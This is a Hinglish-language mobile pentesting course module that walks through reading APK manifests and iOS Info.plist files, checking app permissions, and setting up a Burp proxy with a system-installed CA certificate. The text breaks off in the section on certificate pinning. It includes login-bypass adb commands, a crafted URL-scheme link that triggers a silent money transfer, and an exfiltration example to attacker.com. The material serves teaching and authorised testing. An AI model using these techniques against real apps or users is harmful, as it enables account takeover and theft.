Module 1 mein humne apni lab 💻 setup kar li. Ab waqt hai asli app ko 'cheer-faad' (dissect) karne ka. Hum dekhenge ki ek app file (APK aur IPA) ke andar kya hota hai, uska 'janm patra' (Manifest/Plist) kaise padhte hain, aur kaise app aur server के beech ki saari baatein (network traffic) sunte hain. 🕵️‍♂️

-----

## 2.1: Android Anatomy: APK Structure & AndroidManifest.xml

1.  **🎯 Title / Short Summary:** App ki Janm-Kundli (AndroidManifest.xml) 📜. APK file ko kholna aur uske manifest file ko padhna.

2.  **🤔 Kya hai? (What?):** `AndroidManifest.xml` ek Android app ki sabse important file hai. Yeh OS ko batati hai ki app ka naam kya hai, use kya permissions chahiye, aur uske andar kaun-kaun se components (screens, services) hain.

3.  **💡 Kyu important hai? (Why?):** Attacker ke liye yeh ek treasure map hai. Yeh batata hai ki app mein kahan-kahan attack kiya ja sakta hai. Kya koi screen (Activity) hai jise hum bina login ke direct khol sakte hain? Kya app debug ho sakti hai? Sab yahi likha hota hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh aapka **Static Analysis ka Step 1** hai. App ko phone par install karne se pehle (ya install karke) aapko is file ko check karna hi karna hai. Yeh galti (misconfiguration) developer ki hoti hai jo app ke components ko 'public' (exported) chhod deta hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap app ke 50% attack surface (jaise exported components, deep links, hardcoded keys) ko seedha miss kar denge. Aapko pata hi nahi chalega ki app ki kaun si screen ko direct call karke aap login bypass kar sakte thay.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **APK (Android Package Kit):** Yeh ek `.zip` file hoti hai. Aap `.apk` ko `.zip` rename karke use extract kar sakte hain.
      * **Inside APK:**
          * `classes.dex`: App ka compiled Java/Kotlin code (jise hum JADX se padhenge).
          * `res/`: Saare resources (images, layout XMLs).
          * `lib/`: Native libraries (`.so` files) (jise hum Ghidra se padhenge).
          * `META-INF/`: App ka certificate (signature).
          * `AndroidManifest.xml`: Hamara goldmine\! 🥇 Yeh compiled binary format mein hota hai.
      * **Reading the Manifest:** Hum ise seedha nahi padh sakte. Hume `apktool` ya `JADX-GUI` ka istemaal karna padta hai ise human-readable XML mein decode karne ke liye.

7.  **💻 Code example / Command Example:**

      * **Command (Apktool se decode karna):**

        ```bash
        # 1. Apktool use karke APK ko ek folder mein decode karo
        apktool d vulnerable_app.apk -o VulnerableAppFolder

        # 2. Ab folder mein jaakar Manifest file ko padho
        cat VulnerableAppFolder/AndroidManifest.xml
        ```

      * **✍️ Line-by-line explanation:**

          * `apktool d vulnerable_app.apk -o VulnerableAppFolder`: `d` matlab 'decode'. Yeh `vulnerable_app.apk` ko lega aur uske saare contents ko `VulnerableAppFolder` naam ke folder mein nikaal dega. Sabse important, yeh `AndroidManifest.xml` ko readable XML mein convert kar dega.
          * `cat VulnerableAppFolder/AndroidManifest.xml`: `cat` command se hum us readable XML file ka content terminal par dekhte hain.

      * **Vulnerable Manifest Snippet (Example):**

        ```xml
        <manifest ...>
            <application
                android:allowBackup="true"
                android:debuggable="true"
                android:icon="@mipmap/ic_launcher"
                android:label="@string/app_name">
                
                <activity
                    android:name=".SecretNotesActivity"
                    android:exported="true" />
                    
                <activity
                    android:name=".LoginActivity"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>
                
                <provider
                    android:name=".MyContentProvider"
                    android:exported="true"
                    android:authorities="com.vulnerable.provider" />
                    
            </application>
        </manifest>
        ```

      * **✍️ Line-by-line explanation (Vulnerable parts):**

          * `android:allowBackup="true"`: 🐞 **Khatra\!** Iska matlab hum `adb backup` se app ka poora data (passwords, notes) nikaal sakte hain, bina root ke bhi.
          * `android:debuggable="true"`: 🐞 **Bada Khatra\!** Iska matlab app ko debug kiya ja sakta hai. Koi bhi attacker `jdb` (Java Debugger) se app ko attach karke runtime par values badal sakta hai ya code execution ko control kar sakta hai. Yeh release apps mein *kabhi nahi* hona chahiye.
          * `android:name=".SecretNotesActivity" android:exported="true"`: 🐞 **Critical\!** Yeh ek 'Secret Notes' screen hai jo 'exported' hai. Iska matlab koi bhi doosra (malicious) app is screen ko direct khol sakta hai, bina login kiye. Hum ise `adb` se direct call kar sakte hain.
          * `android:name=".MyContentProvider" android:exported="true"`: 🐞 **Critical\!** Ek Content Provider (jo database access deta hai) poori duniya ke liye 'exported' hai. Koi bhi app is provider se app ka database read/write kar sakti hai.

      * **🚀 Quick run expected output:**
        `apktool` chalane par output files `VulnerableAppFolder` mein aa jaayengi. `cat` karne par upar jaisa XML dikhega.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * APK ko ZIP rename karke `AndroidManifest.xml` ko text editor mein kholna. (Woh binary hota hai, aapko kachra dikhega. Hamesha `apktool` ya `JADX` use karo).
      * Sirf `android:exported="true"` par dhyaan dena. Android 12 se pehle, agar kisi component (jaise Activity) mein `<intent-filter>` hota tha, toh woh *by default* `exported="true"` maana jaata tha\! Yeh bahut log miss kar dete hain.
      * `android:debuggable="true"` ko P4 (Low) bug samajhna. Agar app sensitive hai (banking, health), toh yeh P2 (High) bug ho sakta hai kyunki isse runtime manipulation bahut aasan ho jaata hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Manifest file toh app ke andar hai, attacker isse kaise padhega?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ko client se `.apk` file milti hai.
        2.  Woh `apktool d app.apk` chalata hai.
        3.  Woh `AndroidManifest.xml` ko padhta hai.
        4.  Use dikhta hai: `<activity android:name=".AdminDashboardActivity" android:exported="true" />`.
        5.  Woh phone par app install karta hai, login screen par ruk jaata hai.
        6.  Naya terminal kholta hai aur command chalata hai:
            `adb shell am start -n com.vulnerable.app/.AdminDashboardActivity`
        7.  Boom\! 💥 Bina login ke seedha Admin Dashboard khul jaata hai. Yeh ek critical "Broken Access Control" bug hai.
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker ek "Free Flashlight" app banata hai. Jab user use install karta hai, woh flashlight app background mein check karti hai ki kya phone mein `com.vulnerable.bankapp` install hai. Agar hai, toh woh bank app ke exported "TransferMoneyActivity" ko direct call karti hai aur user ke phone se attacker ke account mein paise transfer kar deti hai.
      * **💰 Real Bug Bounty Example:** **CVE-2020-0096 (Android Bluetooth Privilege Escalation).** Ek system component (Bluetooth) `exported` tha, jisse local apps (bina permission ke) usse interact karke privilege escalate kar sakti thi. Yeh sab Manifest ki galti thi.

10. **✅ Quick checklist / Mitigation:**

      * **Check karo:** `android:debuggable="false"` (release build mein).
      * **Check karo:** `android:allowBackup="false"` (agar sensitive data hai).
      * **Check karo:** Koi bhi sensitive component (Activity, Service, Provider) `android:exported="false"` hona chahiye, jab tak use doosre apps se baat karne ki zaroorat na ho.
      * **Tool:** Hamesha `apktool` ya `JADX-GUI` ka istemaal karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA (Damn Insecure and Vulnerable App) ka APK download karo.
      * `apktool d diva.apk` run karke uske `AndroidManifest.xml` ko padho aur 2 'exported' components dhoondho.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `apktool`, `JADX-GUI` (yeh manifest bhi dikha deta hai), `MobSF` (yeh automatic saari cheezein nikaal deta hai).
      * **Commands:** `adb shell am start -n <package_name>/<activity_name>` (exported activity ko start karne ke liye).

-----

## 2.2: iOS Anatomy: IPA Structure & Info.plist

1.  **🎯 Title / Short Summary:** Apple App ki Kundli (Info.plist) 📜. `.ipa` file ko kholna aur uske `Info.plist` ko padhna.

2.  **🤔 Kya hai? (What?):** `.ipa` (iOS App Store Package) bhi ek `.zip` file hai. Iske andar `Info.plist` file hoti hai, jo iOS ko app ke baare mein sab kuch batati hai (jaise Android ka Manifest).

3.  **💡 Kyu important hai? (Why?):** Attacker ke liye yeh iOS app ka starting point hai. Yeh batata hai ki app kaun se **URL Schemes** register karti hai (jisse dusre apps is app ko khol sakein), user se kaun si **privacy permissions** (jaise Camera, Location) maangti hai, aur kya woh insecure connections (HTTP) allow karti hai (`App Transport Security`).

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh bhi **Static Analysis ka Step 1** hai (iOS ke liye). App ko phone par sideload/install karne se pehle check karna. Yeh galti (misconfiguration) developer ki hoti hai jo dangerous URL schemes register karta hai ya network security ko disable kar deta hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap iOS ke sabse common attack vectors (jaise `Insecure URL Scheme` handling ya `App Transport Security (ATS)` bypasses) ko miss kar denge. Aapko pata hi nahi chalega ki aap Safari se ek link (`vulnerableapp://transfer?to=attacker&amount=1000`) bhej kar app mein direct action karwa sakte thay.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **IPA (iOS App Store Package):** Yeh ek `.zip` file hai. `.ipa` ko `.zip` rename karke extract karo.
      * **Inside IPA:** Aapko ek `Payload/` folder milega.
      * **Inside Payload:** Aapko `<AppName>.app` file milegi (jo asal mein ek folder hai).
      * **Inside \<AppName\>.app:**
          * `<AppName>`: Yeh app ki compiled binary file hai (jise hum Ghidra/IDA se reverse karenge).
          * `Info.plist`: Hamara goldmine\! 🥇 Yeh ek XML file hoti hai (human-readable).
          * `_CodeSignature/`: App ka signature.
          * `Assets.car`: Compiled assets (images, icons).

7.  **💻 Code example / Command Example:**

      * **Command (IPA ko extract karna):**

        ```bash
        # 1. IPA file ko ZIP rename karo (optional, 'unzip' direct bhi kar leta hai)
        mv vulnerable_app.ipa vulnerable_app.zip

        # 2. Unzip karo
        unzip vulnerable_app.zip

        # 3. Info.plist file ko padho (yeh Payload/<AppName>.app/ ke andar hogi)
        cat Payload/VulnerableApp.app/Info.plist
        ```

      * **✍️ Line-by-line explanation:**

          * `mv ...`: File ko `.zip` rename karta hai.
          * `unzip ...`: ZIP file ko extract karta hai.
          * `cat .../Info.plist`: `Info.plist` file (jo plain XML hai) ko terminal par print karta hai.

      * **Vulnerable Info.plist Snippet (Example):**

        ```xml
        <dict>
            <key>CFBundleIdentifier</key>
            <string>com.vulnerable.app</string>
            <key>CFBundleURLTypes</key>
            <array>
                <dict>
                    <key>CFBundleURLSchemes</key>
                    <array>
                        <string>vulnapp</string>
                    </array>
                </dict>
            </array>
            <key>NSAppTransportSecurity</key>
            <dict>
                <key>NSAllowsArbitraryLoads</key>
                <true/>
            </dict>
            <key>NSLocationWhenInUseUsageDescription</key>
            <string>We need your location to find nearby friends.</string>
        </dict>
        ```

      * **✍️ Line-by-line explanation (Vulnerable parts):**

          * `<key>CFBundleURLSchemes</key> ... <string>vulnapp</string>`: 🐞 **Khatra\!** Yeh app ek custom URL scheme `vulnapp://` register kar rahi hai. Iska matlab Safari ya koi bhi dusra app `vulnapp://` se shuru hone wala link bhej kar is app ko trigger kar sakta hai. Agar app is link se data (jaise `vulnapp://settings?show_token=true`) ko insecure tareeke se handle karti hai, toh vulnerability ho sakti hai.
          * `<key>NSAppTransportSecurity</key> ... <key>NSAllowsArbitraryLoads</key> <true/>`: 🐞 **Bada Khatra\!** Isne Apple ki default network security (ATS) ko poori tarah disable kar diya hai. Iska matlab yeh app plain HTTP (non-secure) connections bhi karegi. Hum (attacker) Burp se saara traffic aasani se padh sakte hain, bhale hi SSL pinning na ho (kyunki traffic HTTPS hai hi nahi).
          * `<key>NSLocationWhenInUseUsageDescription</key>`: Yeh vulnerability nahi hai, lekin yeh pentester ko batata hai ki app "Location" ki permission maangegi. Hum check kar sakte hain ki app is data ko misuse toh nahi kar rahi.

      * **🚀 Quick run expected output:**
        `unzip` chalane par `Payload/` folder ban jaayega. `cat` karne par upar jaisa XML dikhega.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * `Info.plist` ko binary samajhna. Android ka Manifest binary hota hai, lekin iOS ka `Info.plist` (mostly) readable XML hota hai.
      * Har URL scheme ko vulnerability samajhna. URL scheme (jaise `fb://`) normal hai. Vulnerability tab hoti hai jab app us scheme se mile data (jaise URL parameters) ko bina sanitize kiye use karti hai (e.g., WebView mein load karna, sensitive action karna).
      * `NSAllowsArbitraryLoads` ko SSL Pinning se confuse karna. Yeh alag hai. Yeh HTTP traffic allow karta hai. SSL Pinning HTTPS traffic ko Burp se bachane ke liye hota hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main kisi ke phone mein install app ko Safari se kaise call kar sakta hoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester `.ipa` ko unzip karke `Info.plist` padhta hai.
        2.  Use dikhta hai: `<string>vulnapp</string>`.
        3.  Woh app ko reverse engineer (Module 3) karke dekhta hai ki `vulnapp://transfer` link se kya hota hai.
        4.  Use pata chalta hai ki `vulnapp://transfer?to=<account>&amount=<value>` URL app ke andar direct transfer function call karta hai, bina user se pooche.
        5.  Pentester ek HTML page banata hai: `<a href="vulnapp://transfer?to=attacker_account&amount=1000">Click for Free Gift!</a>`
        6.  Woh yeh link victim (jo app use karta hai) ko bhejta hai. Victim ke link click karte hi uski `vulnapp` khulti hai aur attacker ke account mein 1000 transfer ho jaate hain. Yeh "Insecure URL Scheme" RCE (Remote Code Execution) ya Logic Flaw hai.
      * **😈 Real Attack Scenario (Criminal Perspective):** Same as above. Attacker ek malicious ad (advertisement) mein is link (`vulnapp://...`) ko embed kar deta hai. Jaise hi user us ad par click karta hai, uske phone mein install bank app se paise chori ho jaate hain.
      * **💰 Real Bug Bounty Example:** Bahut saari apps (jaise Zoom) mein URL schemes mein vulnerabilities paayi gayi hain jisse attacker (bina permission) meeting join karwa sakta tha ya user ki info leak kar sakta tha. (e.g., CVE-2019-13450)

10. **✅ Quick checklist / Mitigation:**

      * **Check karo:** `NSAppTransportSecurity` (ATS). `NSAllowsArbitraryLoads` hamesha `<false/>` hona chahiye.
      * **Check karo:** `CFBundleURLSchemes`. Agar hain, toh check karo ki app unse mile data ko kitna securely handle karti hai. (Yeh Dynamic Analysis ka part hai).
      * **Check karo:** Saari `NS...UsageDescription` keys (jaise `NSCameraUsageDescription`, `NSContactsUsageDescription`). Isse pata chalta hai ki app kya-kya sensitive data maang rahi hai.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (Damn Vulnerable iOS App) ka `.ipa` download karo.
      * Use unzip karke uske `Info.plist` ko padho aur uske URL schemes ki list banao.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `unzip`, `cat`, `MobSF` (yeh bhi Plist ko parse kar deta hai).
      * **Commands:** `unzip <file.ipa>`, `plutil -p <file.plist>` (macOS par Plist ko nicely print karne ke liye).

-----

## 2.3: App Permissions: Android (Over-Privileged) vs. iOS

1.  **🎯 Title / Short Summary:** Haq se zyada maangna (Over-Privileged Apps) ✋. Android aur iOS kaise permissions handle karte hain aur attacker ise kaise dekhta hai.
2.  **🤔 Kya hai? (What?):** Permissions woh gate hain jo app ko phone ke sensitive parts (jaise Camera, Contacts, Location) use karne ki ijaazat dete hain. "Over-privileged" ka matlab hai app ka unn cheezon ki permission maangna jinki use zaroorat hi nahi hai (jaise ek Calculator app ka Contacts maangna).
3.  **💡 Kyu important hai? (Why?):** Attacker ke liye, over-privileged app ek goldmine hai. Agar attacker us app mein *ek* bhi vulnerability (jaise exported component, XSS) dhoondh leta hai, toh woh us vulnerability ke zariye app ki *saari* permissions (jaise Contacts, SMS) ka faayda utha sakta hai.
4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh bhi Static Analysis (Manifest/Plist padhte waqt) ka part hai. Aap app ki functionality ko uski maangi gayi permissions se compare karte hain.
5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap bug ki severity (impact) ko galat judge karenge. Ek simple XSS bug (P4) ek aise app mein jo `READ_SMS` permission rakhta hai, "OTP chori" (P1 - Critical) bug ban jaata hai. Agar aapne permissions check nahi ki, toh aap use P4 hi report karenge.

-----

### ⭐ Comparison: Android vs. iOS Permissions

| Pehlu (Aspect) | 🤖 Android | 🍎 iOS |
| :--- | :--- | :--- |
| **2. Kya hai?** | Permissions `AndroidManifest.xml` mein declare hoti hain. "Dangerous" permissions (like `READ_CONTACTS`) user se runtime par poochhi jaati hain. | Permissions `Info.plist` mein declare hoti hain (usage strings). Har permission (Camera, Location, Photos, Contacts) user se runtime par poochi jaati hai. |
| **3. Kyu important?** (Attacker View) | **Permissions broad hoti hain.** Agar `READ_CONTACTS` mil gaya, toh app *saare* contacts padh sakti hai. Malicious app ke liye zyada data. | **Permissions granular (limited) hoti hain.** User "Select Photos" (sirf 2 photo) ya "All Photos" access de sakta hai. Attacker ke liye data churana mushkil hai. |
| **4. Kab/Kahan?** (Pentester Focus) | `AndroidManifest.xml` mein `<uses-permission>` tags check karo. | `Info.plist` mein `NS...UsageDescription` keys check karo. |
| **5. Agar nahi samjha?** (Consequences) | Aap "Privilege Escalation" ka poora potential miss kar denge. | Aap samajh nahi payenge ki app user se itna data kyun maang rahi hai aur usse kya kar rahi hai. |
| **8. Common Mistakes** | Yeh sochna ki "Normal" permissions (jaise `INTERNET`) safe hain. (Internet permission hi saara data leak karne ke liye kaafi hai). | Yeh sochna ki iOS par permissions maangna safe hai. (Agar app `NSPhotoLibraryUsageDescription` maang kar saari photos server par upload kar rahi hai, toh yeh critical data leak hai). |
| **9. Real-World Scenario** | **Pentester:** Ek Calculator app ko `READ_SMS` permission maangte dekhta hai. Woh app mein ek chhota sa bug dhoondh kar uske zariye background mein SMS padhne ka code trigger kar deta hai -\> **OTP/MFA Bypass\!** | **Pentester:** Ek QR Scanner app ko `NSContactsUsageDescription` maangte dekhta hai. Woh Burp se traffic check karta hai aur paata hai ki app user ke saare contacts ko scan/login ke baad apne server par upload kar rahi hai. **Privacy Violation / Data Leak\!** |
| **11. Key Questions (FAQs)** | *Q: Kya runtime permissions safe hain?*<br>A: User (insaan) ko "Allow/Deny" ka context nahi hota. Woh app chalane ke liye sab "Allow" kar deta hai. Isliye pentester ko check karna zaroori hai. | *Q: iOS par permissions "safer" kyun hain?*<br>A: Woh zyada limited access deti hain. Jaise, iOS 14+ par app ko poori Photo Library ke bajaye sirf "Selected Photos" ka access de sakte hain. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Android Model:**
          * `Normal` Permissions (e.g., `INTERNET`): Install karte hi automatically mil jaati hai.
          * `Dangerous` Permissions (e.g., `READ_CONTACTS`, `READ_SMS`, `ACCESS_FINE_LOCATION`): App ko user se runtime par (jab zaroorat pade) poochhna padta hai.
          * **Pentester's Job:** Dekho ki app jo maang rahi hai (Manifest mein) aur jo uski functionality hai, woh match karti hai ya nahi. Ek "Flashlight" app ko `READ_CONTACTS` kyun chahiye? 🧐
      * **iOS Model:**
          * `Info.plist` mein har permission ke liye ek "Usage Description" (e.g., `NSCameraUsageDescription`) daalna zaroori hai. Yeh string user ko popup mein dikhti hai (e.g., "Yeh app camera use karna chahti hai **taaki aap profile photo le sakein**").
          * **Pentester's Job:** Dekho ki yeh description user ko misguide toh nahi kar raha. Aur, iOS 14+ mein "Limited Access" (jaise "Approximate Location" ya "Select Photos") ka feature hai. Check karo ki app "Full Access" kyun maang rahi hai.

7.  **🐞 Common beginner mistakes (Emphasis):**

      * Permissions ko vulnerability samajhna. **Permission maangna vulnerability nahi hai.** Vulnerability *tab* hai jab app un permissions ka **galat istemaal** kare (jaise data leak karna) ya ek over-privileged app mein koi *doosri* vulnerability (jaise exported activity) ho.
      * Sirf `AndroidManifest.xml` par bharosa karna. Naye Android mein user manually bhi permission deny kar sakta hai.

8.  **🌍 Real-World Attack Scenario (Emphasis):**

      * **🕵️‍♂️ Pentesting Scenario (Android):**
        1.  Pentester dekhta hai ki ek 'Gaming' app `READ_EXTERNAL_STORAGE` aur `INTERNET` permission leti hai.
        2.  Pentester app ko reverse karta hai aur dekhta hai ki app background mein phone ke `Pictures/` aur `Documents/` folder se saari files (photos, PDFs) ko `http://attacker.com/upload` par bhej rahi hai.
        3.  Yeh ek **Spyware** hai jo over-privileged permissions ka faayda utha raha hai.
      * **💰 Real Bug Bounty Example:** **HackerOne Report \#752010 (TikTok).** TikTok app (Android) ne ek "normal" permission (access media files) ka istemaal karke user ke device se sensitive data (jaise zip files) ko apne server par upload karne ki koshish ki thi. Yeh over-privileged behaviour tha.

9.  **✅ Quick checklist / Mitigation:**

      * **Principle of Least Privilege:** App ko sirf wahi permissions do jo use zinda rehne ke liye zaroori hain.
      * **Compare:** App ki features list ko uske permission list se compare karo.
      * **Question:** "Is permission ki yahan kya zaroorat hai?" (e.g., Flashlight app ko Contacts kyun chahiye?)

10. **🏋️‍♀️ Practice exercise (Lab):**

      * Apne phone mein install kisi bhi 3rd party app (jaise Facebook ya Zomato) ki permissions check karo (Settings -\> Apps -\> AppName -\> Permissions).
      * Socho ki kya yeh saari permissions us app ki core functionality ke liye zaroori hain ya nahi.

11. **📚 Further reading / commands / tools:**

      * **Android Docs:** [App Permissions](https://developer.android.com/guide/topics/permissions/overview)
      * **iOS Docs:** [Human Interface Guidelines - Permissions](https://www.google.com/search?q=https://developer.apple.com/design/human-interface-guidelines/patterns/requesting-permission/)

-----

## 2.4: Interception: Burp Suite Proxy Setup (Android & iOS)

1.  **🎯 Title / Short Summary:** App ki Baatein Sunna (Burp Proxy)  eavesdropper. Apne phone ka saara network traffic Burp Suite (hamare PC par) se kaise guzarein.

2.  **🤔 Kya hai? (What?):** Yeh woh process hai jisse hum app aur server ke beech hone waali saari baaton (API calls, data transfer) ko "Man-in-the-Middle" (MITM) attack karke rokte hain, dekhte hain, aur badalte (modify) hain.

3.  **💡 Kyu important hai? (Why?):** App ki 90% vulnerabilities uske **backend API** mein hoti hain (Module 6). API ko hack karne ke liye, pehle humein yeh dekhna padega ki app server se *kya* baat kar rahi hai. Bina traffic dekhe, hum API hack nahi kar sakte.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh **Dynamic Analysis ka Step 1** hai. Lab setup (Module 1) ke baad yeh pehla practical kaam hai. Yeh *hamesha* check karna hai. Yeh "galti" app ki nahi, balki setup ka part hai. Galti *tab* pakdi jaati hai jab app (next topic) isse rokne ki koshish *nahi* karti.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap andhe (blind) ho. Aapko pata hi nahi chalega ki app login kaise karti hai, user ka data kaise bhejti hai, ya password kahan jaata hai. Aap IDOR, BOLA, SQLi (API-side) jaisi critical vulnerabilities ko **100% miss** kar denge.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **The Goal:** Hum chahte hain ki phone ka traffic aisa jaaye:
        `App 📱 ---> Aapka PC (Burp) 💻 ---> Asli Server ☁️`
      * **Kaise Karein:**
        1.  **PC (Burp):** Burp Suite chalao. `Proxy > Options` mein jaao. Ek proxy listener banao jo `All Interfaces` par sune (e.g., port `8080`).
        2.  **PC (IP Address):** Apne PC ka Wi-Fi IP address note karo (e.g., `ipconfig` ya `ifconfig` se). Maan lo yeh `192.168.1.10` hai.
        3.  **Phone (Proxy):** Phone aur PC **same Wi-Fi** par hone chahiye. Phone ki Wi-Fi settings mein jaao, 'Modify Network' karo, aur Manual Proxy set karo. Server/Host mein PC ka IP (`192.168.1.10`) aur Port mein (`8080`) daalo.
        4.  **Phone (Certificate):** Ab aap HTTP traffic dekh sakte ho, lekin HTTPS (secure) traffic nahi (error aayega). HTTPS dekhne ke liye, phone ko Burp ke "jaali" certificate par bharosa karwana padega.
        5.  **Phone (Browser):** Phone ke browser mein `http://burp` (ya `http://192.168.1.10:8080`) kholo.
        6.  "CA Certificate" link par click karo. `cacert.der` file download ho jaayegi.
        7.  **Certificate Installation (The Tricky Part):**
              * **iOS:** Download hui profile ko `Settings > Profile Downloaded` se install karo. Fir `Settings > General > About > Certificate Trust Settings` mein jaakar us "PortSwigger" certificate ke liye "Full Trust" **ON** karo.
              * **Android (10 ya purana):** `Settings > Security > Install from Storage` se certificate install karo. (Naam kuch bhi de do, 'VPN and Apps' select karo).
              * **Android (11 ya naya):** ⚠️ **Sabse Mushkil.** Android 11+ apps user-installed certificates par bharosa *nahi* karti hain. Aapko certificate ko **system-level** par install karna padega, jiske liye **root access zaroori hai**.
                1.  `cacert.der` ko `cacert.pem` mein convert karo (`openssl x509 -inform DER -in cacert.der -out cacert.pem`).
                2.  PEM file ka hash nikaalo (`openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1`). Maan lo hash aaya `9a5ba575`.
                3.  File ko rename karo: `mv cacert.pem 9a5ba575.0`
                4.  `adb root`, `adb remount`
                5.  `adb push 9a5ba575.0 /system/etc/security/cacerts/`
                6.  `adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0`
                7.  Phone ko **Restart** karo.

7.  **💻 Code example / Command Example (Android 11+ System Cert Install):**

    ```bash
    # 1. Burp se 'cacert.der' download karne ke baad (PC par)
    # DER ko PEM mein badlo
    openssl x509 -inform DER -in cacert.der -out cacert.pem

    # 2. PEM ka subject hash nikaalo (sirf pehli line)
    # Output e.g., "9a5ba575"
    openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1

    # 3. File ko hash.0 naam do (e.g., 9a5ba575.0)
    mv cacert.pem 9a5ba575.0

    # 4. Phone mein push karo (phone rooted aur connected hona chahiye)
    adb root
    adb remount
    adb push 9a5ba575.0 /system/etc/security/cacerts/
    adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
    adb reboot
    ```

      * **✍️ Line-by-line explanation:**

          * `openssl x509 ...`: Certificate format ko (DER se PEM) badalta hai.
          * `openssl ... -subject_hash_old`: Android system store ko jo special filename chahiye (hash format), woh generate karta hai.
          * `mv ...`: File ko zaroori naam (`<hash>.0`) deta hai.
          * `adb root / remount`: Root access leta hai aur system partition ko 'writable' banata hai.
          * `adb push ...`: Certificate ko phone ke system trust store (`/system/etc/security/cacerts/`) mein copy karta hai.
          * `chmod 644 ...`: File ko zaroori permissions (readable by all) deta hai.
          * `adb reboot`: Phone ko restart karta hai taaki certificate load ho sake.

      * **🚀 Quick run expected output:**
        Reboot ke baad, phone ki `Settings > Security > Trusted Credentials > System` mein "PortSwigger" ka certificate dikhna chahiye. Ab saari apps ka HTTPS traffic Burp mein aane lagega.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * PC aur Phone ko alag-alag Wi-Fi par rakhna. (Dono **same** network par hone chahiye).
      * PC ke IP ki jagah `127.0.0.1` (localhost) phone ki proxy settings mein daalna. (Phone ko PC ka LAN IP chahiye, e.g., `192.168.x.x`).
      * **iOS:** Certificate install karke "Full Trust" (Step 2) na dena. (Aadha kaam hai).
      * **Android 11+:** Certificate ko 'User' store mein install karke sochna ki sab apps ka traffic dikhega. (Nahi dikhega, 90% apps error dengi. System store mein daalna **anivarya** hai).
      * Burp mein `Proxy > Intercept is ON` chhod dena. (Isse saara traffic ruk jaata hai. Ise `OFF` rakho aur `HTTP History` tab mein traffic dekho. Jab kuch badalna ho, tabhi `Intercept is ON` karo).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main Burp set kar liya, ab kya?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester Burp setup karta hai (jaisa upar bataya).
        2.  Woh app mein login karta hai.
        3.  Woh Burp ke `HTTP History` tab mein dekhta hai. Use ek `POST /api/v1/login` request dikhti hai.
        4.  Request ki body aisi hai: `{"username":"pentester", "password":"Password123"}`.
        5.  **Finding 1:** "Password plain text (HTTP/JSON) mein jaa raha hai. (Agar HTTPS hai toh theek hai, agar HTTP hai toh P1 critical bug hai - `NSAllowsArbitraryLoads` yaad hai?)"
        6.  Response mein ek "JWT Token" (Authentication token) aata hai.
        7.  Ab pentester ko pata hai ki app login ke liye `POST /api/v1/login` use karti hai. Woh is request ko Burp Repeater mein bhej kar password brute-force (Module 6) kar sakta hai.
      * **💰 Real Bug Bounty Example:** Bina Burp setup kiye, 99% bug bounties (jo API par hoti hain) mil hi nahi sakti. Yeh setup *har* report ke liye zaroori hai.

10. **✅ Quick checklist / Mitigation:**

      * PC/Phone **same Wi-Fi** par hain.
      * Phone Proxy mein PC ka **correct LAN IP** hai.
      * **iOS:** Certificate installed hai AUR "Fully Trusted" hai.
      * **Android 11+:** Certificate **System store** mein (root se) installed hai AUR phone reboot ho chuka hai.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Apne rooted emulator/phone par Burp ka system certificate install karo (Android 11+ waala process).
      * Phone ke browser se `https://google.com` kholo aur uska traffic Burp ke `HTTP History` tab mein dekho.

12. **📚 Further reading / commands / tools:**

      * **Tools:** Burp Suite, `openssl` (cert conversion), `adb` (file push).
      * **Guide:** "Installing Burp Certificate Android 11" (Google search karo, aapko 'Magisk' module 'Move Certs' bhi milega jo yeh aasan kar deta hai).

-----

## 2.5: Vulnerability: Lack of Certificate Pinning (MITM)

1.  **🎯 Title / Short Summary:** Jaali Certificate pe Bharosa 📜. Jab app (phone) aur server (asli) ke beech Burp (attacker) ke "jaali" certificate ko app pakad nahi paati.

2.  **🤔 Kya hai? (What?):** Certificate Pinning ek security feature hai jahan app *sirf* apne asli server ke *asli* certificate par hi bharosa karti hai. Agar app mein yeh feature *nahi* (Lack of Pinning) hai, toh woh Burp ke jaali certificate par bhi bharosa kar leti hai, aur hum (attacker) saara HTTPS traffic padh paate hain.

3.  **💡 Kyu important hai? (Why?):** Agar app mein pinning nahi hai, toh koi bhi (attacker, ya coffee shop ke Wi-Fi ka admin) Burp jaisa tool use karke aapka saara secure (HTTPS) traffic (passwords, credit cards, tokens) dekh sakta hai aur badal sakta hai.

